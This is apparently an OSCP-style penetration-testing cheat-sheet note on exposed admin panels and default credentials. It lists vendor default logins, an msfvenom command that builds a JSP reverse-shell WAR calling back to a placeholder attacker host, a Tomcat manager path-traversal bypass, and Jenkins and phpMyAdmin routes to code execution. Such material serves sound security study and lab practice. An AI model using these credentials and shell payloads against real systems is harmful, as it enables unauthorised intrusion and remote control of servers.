---
status: working
tags:
  - web
  - default-creds
  - admin-panels
---
> *Exposed Admin Panels and Default Credentials:* Management interfaces that ship with known defaults or a documented path to code execution. Reach for this on `/admin`, `/manager`, `/phpmyadmin`, printer/router/appliance UIs, and dev consoles.

## Always Try Vendor Fefaults First

`admin/admin`, `tomcat/tomcat`, `root/root`, and product-specific pairs. SecLists' `Default-Credentials` directory is organized by product, so `grep` it for the product name `whatweb` identified.

## Common Panels to a Shell

> [!example] Tomcat manager to WAR shell
> With manager access (defaults like `tomcat:tomcat`, `tomcat:s3cret`), deploy a JSP payload as a WAR and browse to it:
> ```bash
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war -o shell.war
> # upload shell.war via /manager/html, then:
> curl http://$IP:8080/shell/
> ```
> Reverse-proxy path-traversal to reach a locked-down manager: `http://$IP/<app>/..;/manager/html`.

> [!note]
> - **Tomcat `/manager/html`** → WAR deploy (above), JSP runs on the server.
> - **Jenkins** → The Script Console runs Groovy on the server directly, instant execution if you can reach it.
> - **phpMyAdmin** → The SQL tab can read and write files (subject to DB privileges), a route to a webshell or file read. See the file-write payloads in [[SQL Injection]].
> - Any panel with a version string → [[CVE Triage]].

## See Also

- [[Web Enumeration]] for discovering panels
- [[File Upload to Webshell]] and [[msfvenom Payloads]] for the payloads
- [[Brute Forcing and Spraying]] when defaults fail but the login is bruteable
- Source: [[OSCP Field Manual]] section 3.4
